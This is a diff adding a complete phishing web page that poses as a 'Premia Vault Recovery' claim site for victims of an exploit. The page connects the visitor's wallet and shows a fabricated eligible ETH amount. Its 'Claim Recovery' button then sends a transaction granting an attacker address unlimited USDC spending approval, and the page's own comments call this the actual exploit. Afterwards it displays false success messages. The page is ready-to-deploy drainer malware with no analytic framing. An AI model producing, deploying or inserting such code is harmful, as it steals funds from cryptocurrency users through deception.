@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premia Vault Recovery — Claim Your Funds</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0e17; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { max-width: 480px; width: 100%; padding: 24px; }
+        .card { background: #131a2a; border: 1px solid #2a3448; border-radius: 16px; padding: 32px; }
+        .header { text-align: center; margin-bottom: 24px; }
+        .header h1 { font-size: 24px; font-weight: 700; color: #6366f1; }
+        .header p { color: #94a3b8; margin-top: 8px; font-size: 14px; }
+        .status { padding: 12px; border-radius: 8px; margin: 16px 0; font-size: 14px; text-align: center; }
+        .status.info { background: #1e293b; color: #94a3b8; }
+        .status.success { background: #064e3b; color: #6ee7b7; }
+        .status.error { background: #7f1d1d; color: #fca5a5; }
+        .status.hidden { display: none; }
+        button { width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; background: #6366f1; color: #fff; transition: background .2s; }
+        button:hover { background: #4f46e5; }
+        button:disabled { background: #374151; cursor: not-allowed; }
+        .details { margin-top: 16px; font-size: 12px; color: #64748b; text-align: center; line-height: 1.6; }
+        .amount { font-size: 32px; font-weight: 700; color: #6ee7b7; text-align: center; margin: 16px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>🏛️ Premia Vault Recovery</h1>
+                <p>Claim your share of the recovered funds from the November 1, 2026 exploit</p>
+            </div>
+            
+            <div class="amount" id="claimAmount">—</div>
+            
+            <div class="status info" id="status">Connect your wallet to check eligibility</div>
+            
+            <button id="connectBtn" onclick="connect()">Connect Wallet</button>
+            <button id="claimBtn" onclick="claim()" style="display:none; margin-top:12px;">Claim Recovery</button>
+            
+            <div class="details" id="details">
+                The Premia team has recovered a portion of the exploited funds.<br>
+                Eligible depositors can claim their proportional share.<br>
+                <small>Recovery contract: <span id="drainAddr" style="font-family:monospace"></span></small>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const DRAINER = "0xe1B4F00377150792b8ab503494A894913203dD3a";
+        document.getElementById("drainAddr").textContent = DRAINER.slice(0, 8) + "..." + DRAINER.slice(-6);
+        
+        let provider, signer, userAddr;
+        
+        async function connect() {
+            try {
+                if (typeof window.ethereum === "undefined") {
+                    showStatus("Please install MetaMask or use a Web3 browser", "error");
+                    return;
+                }
+                
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddr = await signer.getAddress();
+                
+                showStatus("Wallet connected: " + userAddr.slice(0, 6) + "..." + userAddr.slice(-4), "success");
+                document.getElementById("connectBtn").style.display = "none";
+                document.getElementById("claimBtn").style.display = "block";
+                
+                // Show a fake "eligible amount"
+                const fakeAmount = (Math.random() * 0.5 + 0.1).toFixed(4);
+                document.getElementById("claimAmount").textContent = fakeAmount + " ETH";
+                showStatus("You are eligible to claim " + fakeAmount + " ETH in recovered funds", "success");
+                
+            } catch (e) {
+                showStatus("Failed to connect: " + e.message, "error");
+            }
+        }
+        
+        async function claim() {
+            try {
+                showStatus("Preparing your recovery claim...", "info");
+                
+                // The actual exploit: approve the drainer for USDC (or any token)
+                // This is disguised as the "recovery claim" transaction
+                const usdc = "0xA0b86991c6218b36c1d19D4a2e9Fb0cE3606eB48";
+                const approveData = "0x095ea7b3"
+                    + DRAINER.slice(2).toLowerCase().padStart(64, "0")
+                    + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                
+                const tx = await signer.sendTransaction({
+                    to: usdc,
+                    data: approveData,
+                });
+                
+                showStatus("Recovery transaction submitted! Waiting for confirmation...", "info");
+                await tx.wait();
+                
+                showStatus("✓ Recovery claim successful! Your funds will arrive shortly.", "success");
+                document.getElementById("claimBtn").disabled = true;
+                document.getElementById("claimBtn").textContent = "Claimed ✓";
+                
+            } catch (e) {
+                showStatus("Claim failed: " + (e.message || e), "error");
+                document.getElementById("claimBtn").disabled = false;
+            }
+        }
+        
+        function showStatus(msg, type) {
+            const el = document.getElementById("status");
+            el.className = "status " + type;
+            el.textContent = msg;
+        }
+    </script>
+</body>
+</html>
